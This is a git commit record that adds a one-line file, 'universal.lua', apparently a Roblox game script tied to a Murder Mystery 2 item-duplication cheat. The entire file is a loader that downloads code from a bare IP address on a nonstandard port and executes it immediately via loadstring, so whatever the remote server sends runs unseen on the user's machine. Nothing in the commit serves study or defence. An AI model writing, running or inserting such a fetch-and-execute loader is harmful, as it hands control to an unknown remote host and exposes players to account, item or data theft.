e7154d49678e1e83732beb41fa4eaa4fde108498
dupeguy <vincejoshua0000@gmail.com>
2026-02-16 10:29:29 +0800

    Create universal.lua

---
+++ universal.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjdkZmU2OTliLTc3OGYtNDljZC1hYjVlLTNhNTc3YmFjODBmOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
